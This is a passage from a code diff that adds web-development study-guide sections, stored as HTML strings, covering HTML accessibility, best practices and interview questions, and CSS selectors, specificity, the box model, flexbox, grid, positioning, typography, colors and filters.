+<td><code>&amp;#34;</code></td>
+</tr>
+<tr>
+<td><code>'</code></td>
+<td><code>&amp;apos;</code></td>
+<td><code>&amp;#39;</code></td>
+</tr>
+<tr>
+<td>Non-breaking space</td>
+<td><code>&amp;nbsp;</code></td>
+<td><code>&amp;#160;</code></td>
+</tr>
+<tr>
+<td>©</td>
+<td><code>&amp;copy;</code></td>
+<td><code>&amp;#169;</code></td>
+</tr>
+<tr>
+<td>®</td>
+<td><code>&amp;reg;</code></td>
+<td><code>&amp;#174;</code></td>
+</tr>
+<tr>
+<td>™</td>
+<td><code>&amp;trade;</code></td>
+<td><code>&amp;#8482;</code></td>
+</tr>
+<tr>
+<td>→</td>
+<td><code>&amp;rarr;</code></td>
+<td><code>&amp;#8594;</code></td>
+</tr>
+<tr>
+<td>←</td>
+<td><code>&amp;larr;</code></td>
+<td><code>&amp;#8592;</code></td>
+</tr>
+<tr>
+<td>♥</td>
+<td><code>&amp;hearts;</code></td>
+<td><code>&amp;#9829;</code></td>
+</tr>
+<tr>
+<td>€</td>
+<td><code>&amp;euro;</code></td>
+<td><code>&amp;#8364;</code></td>
+</tr>
+<tr>
+<td>£</td>
+<td><code>&amp;pound;</code></td>
+<td><code>&amp;#163;</code></td>
+</tr>
+</tbody>
+</table>
+ 
+`,
+  "study-guide-html-14": `
+<h2>14. Accessibility (A11y)</h2>
+<pre><code>&lt;!-- Use semantic HTML first — it's inherently accessible --&gt;
+
+&lt;!-- ARIA roles when semantic HTML isn't enough --&gt;
+&lt;div role="alert"&gt;Error: Field is required&lt;/div&gt;
+&lt;div role="dialog" aria-labelledby="dialog-title" aria-modal="true"&gt;
+  &lt;h2 id="dialog-title"&gt;Confirm Action&lt;/h2&gt;
+  ...
+&lt;/div&gt;
+
+&lt;!-- ARIA labels --&gt;
+&lt;button aria-label="Close dialog"&gt;×&lt;/button&gt;
+&lt;nav aria-label="Breadcrumb"&gt;...&lt;/nav&gt;
+
+&lt;!-- Describe elements with aria-describedby --&gt;
+&lt;input id="email" aria-describedby="email-hint" /&gt;
+&lt;span id="email-hint"&gt;Enter your work email address&lt;/span&gt;
+
+&lt;!-- Live regions for dynamic content --&gt;
+&lt;div aria-live="polite"&gt;Status: Loading...&lt;/div&gt;
+&lt;div aria-live="assertive"&gt;Critical: Error occurred!&lt;/div&gt;
+
+&lt;!-- Skip navigation for keyboard users --&gt;
+&lt;a href="#main-content" class="skip-link"&gt;Skip to main content&lt;/a&gt;
+
+&lt;!-- Images --&gt;
+&lt;img src="logo.png" alt="Company Name" /&gt;             &lt;!-- Informative --&gt;
+&lt;img src="decoration.png" alt="" role="presentation" /&gt; &lt;!-- Decorative --&gt;
+
+&lt;!-- Hidden from screen readers but visible --&gt;
+&lt;span aria-hidden="true"&gt;★★★★☆&lt;/span&gt;
+&lt;span class="sr-only"&gt;4 out of 5 stars&lt;/span&gt;
+
+&lt;!-- Tab order --&gt;
+&lt;div tabindex="0"&gt;Focusable div&lt;/div&gt;       &lt;!-- In normal tab order --&gt;
+&lt;div tabindex="-1"&gt;Focusable via JS only&lt;/div&gt;
+</code></pre>
+<h3>The 4 POUR Principles of Accessibility</h3>
+<ol>
+<li><strong>Perceivable</strong> — Information must be presentable in ways users can perceive (alt text, captions)</li>
+<li><strong>Operable</strong> — Interface must be operable (keyboard navigation, no seizure-inducing content)</li>
+<li><strong>Understandable</strong> — Content must be understandable (clear language, predictable behavior)</li>
+<li><strong>Robust</strong> — Content must be interpreted by various assistive technologies</li>
+</ol>
+
+`,
+  "study-guide-html-15": `
+<h2>15. HTML Comments and Best Practices</h2>
+<pre><code>&lt;!-- This is an HTML comment — not visible in browser --&gt;
+
+&lt;!--
+  Multi-line comment
+  Useful for temporarily disabling code
+--&gt;
+</code></pre>
+<h3>Best Practices Checklist</h3>
+<ul>
+<li>✅ Always include <code>&lt;!DOCTYPE html&gt;</code></li>
+<li>✅ Set <code>lang</code> attribute on <code>&lt;html&gt;</code></li>
+<li>✅ Include <code>charset</code> and <code>viewport</code> meta tags</li>
+<li>✅ Use semantic elements over generic <code>div</code>/<code>span</code></li>
+<li>✅ Always provide <code>alt</code> text for images</li>
+<li>✅ Associate labels with inputs using <code>for</code>/<code>id</code></li>
+<li>✅ Use <code>&lt;button&gt;</code> for buttons (not <code>&lt;div&gt;</code> or <code>&lt;a&gt;</code>)</li>
+<li>✅ Validate HTML at <a href="https://validator.w3.org">validator.w3.org</a></li>
+<li>✅ Keep markup clean and well-indented</li>
+<li>✅ Don't use deprecated elements (<code>&lt;font&gt;</code>, <code>&lt;center&gt;</code>, <code>&lt;marquee&gt;</code>)</li>
+<li>✅ Test with keyboard-only navigation</li>
+<li>✅ Test with a screen reader (NVDA, VoiceOver)</li>
+</ul>
+
+`,
+  "study-guide-html-16": `
+<h2>16. HTML5 APIs Overview</h2>
+<p>HTML5 introduced built-in browser APIs:</p>
+<table>
+<thead>
+<tr>
+<th>API</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Canvas API</td>
+<td>Draw 2D graphics with <code>&lt;canvas&gt;</code></td>
+</tr>
+<tr>
+<td>Geolocation API</td>
+<td>Get user's location</td>
+</tr>
+<tr>
+<td>Web Storage</td>
+<td>localStorage, sessionStorage</td>
+</tr>
+<tr>
+<td>Web Workers</td>
+<td>Background threads</td>
+</tr>
+<tr>
+<td>WebSockets</td>
+<td>Real-time communication</td>
+</tr>
+<tr>
+<td>Drag and Drop</td>
+<td>Native drag-and-drop</td>
+</tr>
+<tr>
+<td>History API</td>
+<td>Manipulate browser history</td>
+</tr>
+<tr>
+<td>File API</td>
+<td>Read local files</td>
+</tr>
+<tr>
+<td>Notifications API</td>
+<td>Show desktop notifications</td>
+</tr>
+<tr>
+<td>Service Workers</td>
+<td>Offline support (PWAs)</td>
+</tr>
+</tbody>
+</table>
+
+`,
+  "study-guide-html-17": `
+<h2>17. Common HTML Interview Questions</h2>
+<p><strong>Q: What's the difference between <code>id</code> and <code>class</code>?</strong>
+A: <code>id</code> must be unique per page and is used to identify a single element. <code>class</code> can be reused on multiple elements and is for styling groups.</p>
+<p><strong>Q: What is the difference between <code>&lt;b&gt;</code> and <code>&lt;strong&gt;</code>?</strong>
+A: Both appear bold visually, but <code>&lt;strong&gt;</code> has semantic meaning (important), while <code>&lt;b&gt;</code> is purely visual. Screen readers may emphasize <code>&lt;strong&gt;</code> differently.</p>
+<p><strong>Q: What is a void/self-closing element?</strong>
+A: Elements with no content and no closing tag: <code>&lt;img&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;br&gt;</code>, <code>&lt;hr&gt;</code>, <code>&lt;meta&gt;</code>, <code>&lt;link&gt;</code>.</p>
+<p><strong>Q: What is the difference between <code>GET</code> and <code>POST</code> in forms?</strong>
+A: <code>GET</code> sends data in the URL (visible, cached, limited size — good for searches). <code>POST</code> sends data in the request body (not visible in URL, no size limit, better for sensitive data).</p>
+<p><strong>Q: What are data attributes?</strong>
+A: Custom attributes prefixed with <code>data-</code> that store extra information: <code>&lt;div data-user-id="42"&gt;</code>. Accessed in JS via <code>element.dataset.userId</code>.</p>
+<p><strong>Q: What does <code>defer</code> vs <code>async</code> do on script tags?</strong>
+A: Both load the script without blocking HTML parsing. <code>defer</code> executes scripts in order after HTML is fully parsed. <code>async</code> executes as soon as downloaded, in any order.</p>
+
+<p><em>End of HTML Study Guide</em></p>
+
+`,
+  "study-guide-css-01": `
+<h2>1. What Is CSS?</h2>
+<p>CSS (Cascading Style Sheets) controls the <strong>visual presentation</strong> of HTML elements. While HTML defines structure and meaning, CSS defines color, layout, spacing, typography, animation, and responsiveness.</p>
+<p>The "cascading" in CSS refers to how styles are applied: when multiple rules target the same element, a priority system (the <strong>cascade</strong>) determines which styles win.</p>
+
+`,
+  "study-guide-css-02": `
+<h2>2. Adding CSS to HTML</h2>
+<h3>Inline (least preferred)</h3>
+<pre><code>&lt;p style="color: red; font-size: 18px;"&gt;Inline styles&lt;/p&gt;
+</code></pre>
+<h3>Internal (in <code>&lt;head&gt;</code>)</h3>
+<pre><code>&lt;style&gt;
+  p { color: red; }
+&lt;/style&gt;
+</code></pre>
+<h3>External (preferred)</h3>
+<pre><code>&lt;link rel="stylesheet" href="styles.css" /&gt;
+</code></pre>
+
+`,
+  "study-guide-css-03": `
+<h2>3. CSS Syntax</h2>
+<pre><code>selector {
+  property: value;   /* declaration */
+  property: value;
+}
+</code></pre>
+<pre><code>/* This is a CSS comment */
+
+/* Multiple selectors with same rules */
+h1, h2, h3 {
+  font-family: sans-serif;
+  color: #333;
+}
+</code></pre>
+
+`,
+  "study-guide-css-04": `
+<h2>4. Selectors (The Core of CSS)</h2>
+<h3>Basic Selectors</h3>
+<pre><code>/* Universal: selects ALL elements */
+* { box-sizing: border-box; }
+
+/* Type/Element: all &lt;p&gt; elements */
+p { color: gray; }
+
+/* Class: any element with class="card" */
+.card { border: 1px solid #ccc; }
+
+/* ID: the ONE element with id="header" */
+#header { background: navy; }
+
+/* Attribute: elements with that attribute */
+[type="text"] { border: 1px solid blue; }
+[href^="https"] { color: green; }    /* href starts with https */
+[href$=".pdf"] { color: red; }       /* href ends with .pdf */
+[class*="btn"] { cursor: pointer; }  /* class contains "btn" */
+[data-active] { font-weight: bold; } /* has data-active attr */
+</code></pre>
+<h3>Combinators</h3>
+<pre><code>/* Descendant: all &lt;p&gt; inside .container (any depth) */
+.container p { margin: 0; }
+
+/* Child: only DIRECT &lt;li&gt; children of &lt;ul&gt; */
+ul &gt; li { list-style: disc; }
+
+/* Adjacent sibling: &lt;p&gt; that comes immediately after &lt;h2&gt; */
+h2 + p { font-size: 1.1em; }
+
+/* General sibling: all &lt;p&gt; elements that follow an &lt;h2&gt; */
+h2 ~ p { color: #555; }
+</code></pre>
+<h3>Pseudo-Classes (element state)</h3>
+<pre><code>a:link      { color: blue; }      /* Unvisited link */
+a:visited   { color: purple; }    /* Visited link */
+a:hover     { color: red; }       /* Mouse over */
+a:active    { color: orange; }    /* Being clicked */
+a:focus     { outline: 2px solid blue; } /* Keyboard focused */
+
+button:disabled { opacity: 0.5; cursor: not-allowed; }
+input:checked   { accent-color: green; }
+input:valid     { border-color: green; }
+input:invalid   { border-color: red; }
+input:required  { border-left: 3px solid red; }
+input:optional  { border-left: 3px solid gray; }
+input:focus-within { background: #f0f8ff; }  /* Self or child focused */
+
+/* Structural pseudo-classes */
+li:first-child   { font-weight: bold; }
+li:last-child    { border-bottom: none; }
+li:nth-child(2)  { background: #eee; }         /* Exactly 2nd */
+li:nth-child(odd)  { background: #f9f9f9; }    /* 1, 3, 5... */
+li:nth-child(even) { background: #fff; }       /* 2, 4, 6... */
+li:nth-child(3n)   { color: red; }             /* Every 3rd */
+li:nth-child(2n+1) { color: blue; }            /* Same as odd */
+li:first-of-type { ... }  /* First &lt;li&gt; of its type in parent */
+li:last-of-type  { ... }
+li:nth-of-type(2) { ... }
+p:only-child     { ... }   /* Only element in its parent */
+p:only-of-type   { ... }
+:not(.active)    { opacity: 0.7; }   /* Negation */
+:is(h1, h2, h3) { color: navy; }    /* Matches any in list */
+:where(h1, h2)  { margin: 0; }      /* Like :is but 0 specificity */
+:has(img)        { border: 1px solid; } /* Parent that has img child */
+
+/* Empty and not-empty */
+p:empty          { display: none; }
+</code></pre>
+<h3>Pseudo-Elements (virtual elements)</h3>
+<pre><code>p::before {
+  content: "→ ";
+  color: red;
+}
+
+p::after {
+  content: " ✓";
+}
+
+p::first-line    { font-weight: bold; }
+p::first-letter  { font-size: 3em; float: left; }
+
+input::placeholder { color: #aaa; font-style: italic; }
+::selection { background: yellow; color: black; }
+::marker    { color: red; }  /* List bullet/number */
+</code></pre>
+
+`,
+  "study-guide-css-05": `
+<h2>5. The Cascade, Specificity, and Inheritance</h2>
+<h3>Cascade Order (lower → higher priority)</h3>
+<ol>
+<li>Browser default styles</li>
+<li>External stylesheets</li>
+<li>Internal <code>&lt;style&gt;</code> block</li>
+<li>Inline <code>style</code> attribute</li>
+<li><code>!important</code> declarations</li>
+</ol>
+<h3>Specificity Calculation</h3>
+<p>Specificity is scored as <code>(A, B, C, D)</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Selector</th>
+<th>A</th>
+<th>B</th>
+<th>C</th>
+<th>D</th>
+<th>Score</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>*</code></td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+</tr>
+<tr>
+<td><code>p</code></td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td><code>.class</code></td>
+<td>0</td>
+<td>0</td>
+<td>1</td>
+<td>0</td>
+<td>10</td>
+</tr>
+<tr>
+<td><code>#id</code></td>
+<td>0</td>
+<td>1</td>
+<td>0</td>
+<td>0</td>
+<td>100</td>
+</tr>
+<tr>
+<td>Inline style</td>
+<td>1</td>
+<td>0</td>
+<td>0</td>
+<td>0</td>
+<td>1000</td>
+</tr>
+<tr>
+<td><code>!important</code></td>
+<td>Overrides everything</td>
+<td></td>
+<td></td>
+<td></td>
+<td>∞</td>
+</tr>
+</tbody>
+</table>
+<pre><code>/* Specificity examples */
+p            { color: black; }    /* 0,0,0,1 */
+.intro       { color: blue; }     /* 0,0,1,0 — wins over p */
+#main        { color: green; }    /* 0,1,0,0 — wins over .intro */
+p.intro#main { color: red; }      /* 0,1,1,1 — most specific */
+p { color: pink !important; }     /* !important — beats everything */
+</code></pre>
+<h3>Inheritance</h3>
+<p>Some properties <strong>inherit</strong> from parent to child automatically:</p>
+<ul>
+<li>Color, font-<em>, text-</em>, line-height, visibility, cursor</li>
+</ul>
+<p>Some properties do <strong>not</strong> inherit:</p>
+<ul>
+<li>Width, height, margin, padding, border, background, display, position</li>
+</ul>
+<pre><code>/* Control inheritance explicitly */
+p { color: inherit; }     /* Force inherit from parent */
+p { color: initial; }     /* Reset to browser default */
+p { color: unset; }       /* Inherit if inheritable, else initial */
+p { color: revert; }      /* Roll back to browser stylesheet */
+</code></pre>
+
+`,
+  "study-guide-css-06": `
+<h2>6. The Box Model</h2>
+<p>Every element is a rectangular box consisting of:</p>
+<pre><code>┌──────────────────────────────────┐
+│            MARGIN                │
+│  ┌────────────────────────────┐  │
+│  │          BORDER            │  │
+│  │  ┌──────────────────────┐  │  │
+│  │  │       PADDING        │  │  │
+│  │  │  ┌────────────────┐  │  │  │
+│  │  │  │    CONTENT     │  │  │  │
+│  │  │  │  width x height│  │  │  │
+│  │  │  └────────────────┘  │  │  │
+│  │  └──────────────────────┘  │  │
+│  └────────────────────────────┘  │
+└──────────────────────────────────┘
+</code></pre><pre><code>.box {
+  /* Content dimensions */
+  width: 200px;
+  height: 100px;
+  min-width: 100px;
+  max-width: 500px;
+  min-height: 50px;
+  max-height: 300px;
+
+  /* Padding (inside border) */
+  padding: 10px;                    /* All sides */
+  padding: 10px 20px;               /* top/bottom left/right */
+  padding: 10px 15px 20px 25px;     /* top right bottom left */
+  padding-top: 10px;
+  padding-right: 20px;
+  padding-bottom: 10px;
+  padding-left: 20px;
+
+  /* Border */
+  border: 2px solid black;
+  border: 2px dashed red;
+  border: 2px dotted blue;
+  border-top: 3px double green;
+  border-radius: 10px;              /* Rounded corners */
+  border-radius: 50%;               /* Circle (if square) */
+  border-radius: 10px 20px 30px 40px; /* top-left, top-right, bottom-right, bottom-left */
+
+  /* Margin (outside border) */
+  margin: 20px;
+  margin: 10px auto;                /* Center horizontally */
+  margin-top: 20px;
+
+  /* Auto collapsing: adjacent vertical margins collapse to the larger value */
+}
+
+/* Box model modes */
+.content-box {
+  box-sizing: content-box;   /* Default: width = content only */
+  /* Total width = width + padding + border */
+}
+
+.border-box {
+  box-sizing: border-box;    /* Recommended: width includes padding + border */
+  /* Total width = width (padding/border eat INTO width) */
+}
+
+/* Global best practice */
+*, *::before, *::after {
+  box-sizing: border-box;
+}
+</code></pre>
+
+`,
+  "study-guide-css-07": `
+<h2>7. Display Property</h2>
+<pre><code>/* Block: full width, starts new line */
+div, p, h1-h6, ul, ol, li, section, article { display: block; }
+
+/* Inline: flows with text, no width/height */
+span, a, strong, em { display: inline; }
+
+/* Inline-block: flows with text BUT accepts width/height */
+.badge { display: inline-block; width: 80px; text-align: center; }
+
+/* None: removed from page (not just invisible) */
+.hidden { display: none; }
+
+/* Flex: flexbox container */
+.flex-container { display: flex; }
+
+/* Grid: grid container */
+.grid-container { display: grid; }
+
+/* Table display types */
+table { display: table; }
+tr    { display: table-row; }
+td    { display: table-cell; }
+
+/* List item */
+li { display: list-item; }
+</code></pre>
+
+`,
+  "study-guide-css-08": `
+<h2>8. Flexbox (1-Dimensional Layout)</h2>
+<p>Flexbox is for laying out items in a <strong>row or column</strong>.</p>
+<h3>Container Properties</h3>
+<pre><code>.flex-container {
+  display: flex;                         /* or inline-flex */
+
+  /* Main axis direction */
+  flex-direction: row;                   /* → (default) */
+  flex-direction: row-reverse;           /* ← */
+  flex-direction: column;                /* ↓ */
+  flex-direction: column-reverse;        /* ↑ */
+
+  /* Wrap behavior */
+  flex-wrap: nowrap;                     /* Single line (default) */
+  flex-wrap: wrap;                       /* Multi-line */
+  flex-wrap: wrap-reverse;              /* Multi-line reversed */
+
+  /* Shorthand */
+  flex-flow: row wrap;
+
+  /* Alignment on MAIN axis (horizontal for row) */
+  justify-content: flex-start;           /* Pack to start (default) */
+  justify-content: flex-end;             /* Pack to end */
+  justify-content: center;               /* Center */
+  justify-content: space-between;        /* First/last at edges */
+  justify-content: space-around;         /* Equal space around each */
+  justify-content: space-evenly;         /* Perfectly equal spacing */
+
+  /* Alignment on CROSS axis (vertical for row) */
+  align-items: stretch;                  /* Fill container (default) */
+  align-items: flex-start;              /* Top */
+  align-items: flex-end;                /* Bottom */
+  align-items: center;                   /* Center */
+  align-items: baseline;                 /* Text baseline */
+
+  /* Alignment of wrapped lines */
+  align-content: flex-start;
+  align-content: flex-end;
+  align-content: center;
+  align-content: space-between;
+  align-content: space-around;
+  align-content: stretch;               /* Default */
+
+  /* Gap between items */
+  gap: 20px;                            /* row-gap and column-gap */
+  gap: 20px 10px;                       /* row-gap column-gap */
+  row-gap: 20px;
+  column-gap: 10px;
+}
+</code></pre>
+<h3>Item Properties</h3>
+<pre><code>.flex-item {
+  /* Order (default 0; lower = first) */
+  order: 0;
+  order: -1;   /* Move before siblings */
+  order: 1;    /* Move after siblings */
+
+  /* Grow: how much item grows to fill space */
+  flex-grow: 0;    /* Don't grow (default) */
+  flex-grow: 1;    /* Grow equally with siblings */
+  flex-grow: 2;    /* Grow twice as fast as flex-grow:1 */
+
+  /* Shrink: how much item shrinks when space is tight */
+  flex-shrink: 1;  /* Shrink equally (default) */
+  flex-shrink: 0;  /* Never shrink */
+
+  /* Basis: initial size before grow/shrink */
+  flex-basis: auto;    /* Use item's content size (default) */
+  flex-basis: 200px;   /* Fixed starting size */
+  flex-basis: 25%;     /* Percentage of container */
+
+  /* Shorthand: flex: grow shrink basis */
+  flex: 1;            /* flex: 1 1 0 */
+  flex: auto;         /* flex: 1 1 auto */
+  flex: none;         /* flex: 0 0 auto — don't grow or shrink */
+  flex: 0 0 200px;    /* Fixed 200px, no grow/shrink */
+
+  /* Self alignment (overrides align-items) */
+  align-self: auto;
+  align-self: flex-start;
+  align-self: flex-end;
+  align-self: center;
+  align-self: stretch;
+}
+</code></pre>
+<h3>Common Flexbox Patterns</h3>
+<pre><code>/* Perfect center */
+.center {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+/* Navbar: logo left, links right */
+nav {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+/* Card grid */
+.card-grid {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 20px;
+}
+.card {
+  flex: 0 0 calc(33.333% - 14px); /* 3 per row with gap */
+}
+</code></pre>
+
+`,
+  "study-guide-css-09": `
+<h2>9. CSS Grid (2-Dimensional Layout)</h2>
+<p>Grid is for laying out items in both <strong>rows and columns</strong>.</p>
+<h3>Container Properties</h3>
+<pre><code>.grid-container {
+  display: grid;             /* or inline-grid */
+
+  /* Define columns */
+  grid-template-columns: 200px 1fr 1fr;      /* 3 columns */
+  grid-template-columns: repeat(3, 1fr);     /* 3 equal columns */
+  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));  /* Responsive */
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+
+  /* Define rows */
+  grid-template-rows: 80px auto 60px;        /* header, content, footer */
+  grid-template-rows: repeat(3, 1fr);
+
+  /* Named areas */
+  grid-template-areas:
+    "header header header"
+    "sidebar main main"
+    "footer footer footer";
+
+  /* Gaps */
+  gap: 20px;
+  row-gap: 20px;
+  column-gap: 10px;
+
+  /* Justify items (inline / horizontal) */
+  justify-items: start;
+  justify-items: end;
+  justify-items: center;
+  justify-items: stretch;   /* Default */
+
+  /* Align items (block / vertical) */
+  align-items: start;
+  align-items: end;
+  align-items: center;
+  align-items: stretch;     /* Default */
+
+  /* Justify entire grid in container */
+  justify-content: start;
+  justify-content: end;
+  justify-content: center;
+  justify-content: space-between;
+  justify-content: space-around;
+  justify-content: space-evenly;
+
+  /* Align entire grid in container */
+  align-content: start;
+  align-content: end;
+  align-content: center;
+  align-content: space-between;
+
+  /* Auto-generated rows size */
+  grid-auto-rows: 100px;
+  grid-auto-columns: 1fr;
+  grid-auto-flow: row;       /* Fill rows first */
+  grid-auto-flow: column;    /* Fill columns first */
+  grid-auto-flow: row dense; /* Fill gaps */
+}
+</code></pre>
+<h3>Item Placement</h3>
+<pre><code>.item-1 {
+  /* Span specific columns */
+  grid-column: 1;              /* Column line 1 to 2 */
+  grid-column: 1 / 3;          /* Column lines 1 to 3 */
+  grid-column: 1 / span 2;     /* Start at 1, span 2 */
+  grid-column: 2 / -1;         /* From 2 to last line */
+
+  /* Span specific rows */
+  grid-row: 1;
+  grid-row: 1 / 4;
+  grid-row: 1 / span 3;
+
+  /* Named area placement */
+  grid-area: header;
+  grid-area: sidebar;
+  grid-area: main;
+
+  /* Self-alignment */
+  justify-self: start | end | center | stretch;
+  align-self: start | end | center | stretch;
+}
+</code></pre>
+<h3>Named Grid Areas Example</h3>
+<pre><code>.layout {
+  display: grid;
+  grid-template-columns: 250px 1fr;
+  grid-template-rows: 80px 1fr 60px;
+  grid-template-areas:
+    "header  header"
+    "sidebar content"
+    "footer  footer";
+  min-height: 100vh;
+  gap: 10px;
+}
+
+.site-header  { grid-area: header; }
+.site-sidebar { grid-area: sidebar; }
+.site-content { grid-area: content; }
+.site-footer  { grid-area: footer; }
+</code></pre>
+
+`,
+  "study-guide-css-10": `
+<h2>10. CSS Positioning</h2>
+<pre><code>/* Static: default, in normal flow */
+.default { position: static; }
+
+/* Relative: offset from its normal position */
+.offset {
+  position: relative;
+  top: 10px;    /* Move down 10px from where it would be */
+  left: 20px;   /* Move right 20px */
+}
+
+/* Absolute: removed from flow, positioned relative to nearest 
+   non-static ancestor */
+.absolute-child {
+  position: absolute;
+  top: 0;
+  right: 0;         /* Top-right corner of parent */
+  width: 100px;
+  height: 100px;
+}
+.parent { position: relative; } /* Establishes positioning context */
+
+/* Fixed: removed from flow, positioned relative to VIEWPORT */
+.fixed-header {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;         /* Full width */
+  z-index: 1000;    /* Stack on top */
+}
+
+/* Sticky: relative until scroll threshold, then fixed */
+.sticky-nav {
+  position: sticky;
+  top: 0;           /* Sticks to top when reached */
+  z-index: 100;
+}
+
+/* Z-index: stacking order (higher = on top) */
+.overlay { z-index: 999; }
+.modal   { z-index: 1000; }
+.tooltip { z-index: 1001; }
+</code></pre>
+
+`,
+  "study-guide-css-11": `
+<h2>11. Typography</h2>
+<pre><code>/* Font families */
+body {
+  font-family: 'Roboto', Arial, Helvetica, sans-serif;
+  /* System UI font stack */
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  /* Monospace */
+  font-family: 'Fira Code', 'Courier New', monospace;
+}
+
+/* Font size */
+h1 { font-size: 3rem; }      /* rem = relative to root element */
+p  { font-size: 1rem; }      /* 1rem = 16px by default */
+small { font-size: 0.875em; } /* em = relative to parent element */
+
+/* Font weight */
+.thin    { font-weight: 100; }
+.light   { font-weight: 300; }
+.normal  { font-weight: 400; }
+.medium  { font-weight: 500; }
+.semibold{ font-weight: 600; }
+.bold    { font-weight: 700; }
+.black   { font-weight: 900; }
+
+/* Font style */
+em { font-style: italic; }
+.upright { font-style: normal; }
+
+/* Line height */
+p { line-height: 1.6; }      /* Unitless = multiplier of font-size */
+p { line-height: 24px; }
+
+/* Letter and word spacing */
+h1 { letter-spacing: -0.02em; }     /* Tighten headings */
+.wide { letter-spacing: 0.1em; }    /* Wide tracking */
+p { word-spacing: 2px; }
+
+/* Text alignment */
+.left    { text-align: left; }
+.center  { text-align: center; }
+.right   { text-align: right; }
+.justify { text-align: justify; }
+
+/* Text decoration */
+a { text-decoration: none; }
+u { text-decoration: underline; }
+.strikethrough { text-decoration: line-through; }
+.underline-custom {
+  text-decoration: underline dotted red 2px;
+  text-underline-offset: 4px;
+}
+
+/* Text transform */
+.upper { text-transform: uppercase; }
+.lower { text-transform: lowercase; }
+.cap   { text-transform: capitalize; }
+
+/* Text overflow and wrapping */
+.truncate {
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.multi-line-clamp {
+  display: -webkit-box;
+  -webkit-line-clamp: 3;
+  -webkit-box-orient: vertical;
+  overflow: hidden;
+}
+
+/* Whitespace handling */
+pre  { white-space: pre; }          /* Preserve all whitespace */
+p    { white-space: normal; }       /* Collapse and wrap (default) */
+.nowrap { white-space: nowrap; }    /* Never wrap */
+
+/* Google Fonts import */
+@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap');
+
+/* Custom font */
+@font-face {
+  font-family: 'MyFont';
+  src: url('font.woff2') format('woff2'),
+       url('font.woff') format('woff');
+  font-weight: normal;
+  font-style: normal;
+  font-display: swap;   /* Show fallback while loading */
+}
+</code></pre>
+
+`,
+  "study-guide-css-12": `
+<h2>12. Colors and Backgrounds</h2>
+<pre><code>/* Color formats */
+.color-examples {
+  color: red;                         /* Named */
+  color: #ff0000;                     /* Hex (6-digit) */
+  color: #f00;                        /* Hex (3-digit shorthand) */
+  color: #ff0000ff;                   /* Hex (8-digit with alpha) */
+  color: rgb(255, 0, 0);              /* RGB */
+  color: rgba(255, 0, 0, 0.5);       /* RGBA (alpha = opacity) */
+  color: hsl(0, 100%, 50%);          /* HSL (hue, saturation, lightness) */
+  color: hsla(0, 100%, 50%, 0.5);    /* HSLA */
+  color: oklch(50% 0.2 30);          /* Modern: perceptually uniform */
+  color: currentColor;               /* Inherits current text color */
+  color: transparent;
+}
+
+/* Backgrounds */
+.bg-examples {
+  background-color: #f0f0f0;
+  background-color: transparent;
+
+  background-image: url('bg.jpg');
+  background-image: url('top.png'), url('bottom.png'); /* Multiple layers */
+  background-image: linear-gradient(to right, red, blue);
+  background-image: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  background-image: radial-gradient(circle at center, red, blue);
+  background-image: conic-gradient(red, yellow, green, red);
+  background-image: repeating-linear-gradient(45deg, #f5f5f5, #f5f5f5 10px, #fff 10px, #fff 20px);
+
+  background-size: cover;         /* Cover container (may crop) */
+  background-size: contain;       /* Fit inside (may leave space) */
+  background-size: 100% 100%;    /* Stretch to fill */
+  background-size: 200px 100px;  /* Explicit size */
+
+  background-position: center center;
+  background-position: top right;
+  background-position: 50% 25%;
+
+  background-repeat: no-repeat;
+  background-repeat: repeat-x;
+  background-repeat: repeat-y;
+  background-repeat: repeat;
+  background-repeat: space;
+  background-repeat: round;
+
+  background-attachment: fixed;  /* Parallax effect */
+  background-attachment: scroll; /* Default */
+  background-attachment: local;
+
+  background-origin: padding-box;   /* Default */
+  background-origin: border-box;
+  background-origin: content-box;
+
+  background-clip: padding-box;    /* Default */
+  background-clip: border-box;
+  background-clip: content-box;
+  background-clip: text;           /* Text mask effect */
+  -webkit-background-clip: text;
+  color: transparent;              /* Show gradient through text */
+
+  /* Shorthand: color image position/size repeat attachment */
+  background: #f0f0f0 url('bg.jpg') center/cover no-repeat fixed;
+}
+</code></pre>
+
+`,
+  "study-guide-css-13": `
+<h2>13. Shadows and Filters</h2>
+<pre><code>/* Box shadow */
+.shadow {
+  box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
+  /* x-offset y-offset blur-radius color */
+
+  box-shadow: 2px 2px 5px 2px rgba(0,0,0,0.3);
+  /* x y blur spread color */
+
+  box-shadow: inset 0 0 10px rgba(0,0,0,0.2);
+  /* inset shadow (inside element) */
+
+  /* Multiple shadows */
+  box-shadow: 
+    0 1px 2px rgba(0,0,0,0.1),
+    0 4px 8px rgba(0,0,0,0.1);
+}
+
+/* Text shadow */
+.text-shadow {
+  text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+  /* x-offset y-offset blur color */
+}
+
+/* CSS Filters */
+.filter-examples {
+  filter: blur(5px);
+  filter: brightness(150%);     /* 0% = black, 100% = original */
+  filter: contrast(200%);
+  filter: grayscale(100%);      /* Black and white */
+  filter: hue-rotate(90deg);
+  filter: invert(100%);
+  filter: opacity(50%);
+  filter: saturate(200%);
+  filter: sepia(100%);
+  filter: drop-shadow(2px 2px 4px black);  /* Like box-shadow for non-rectangular shapes */
+
+  /* Chaining filters */
+  filter: grayscale(50%) brightness(120%);
+}
+
+/* Backdrop filter */
+.frosted-glass {
+  backdrop-filter: blur(10px);
+  background: rgba(255,255,255,0.2);
+}
+</code></pre>
+
+`,
+  "study-guide-css-14": `
+<h2>14. CSS Transitions</h2>
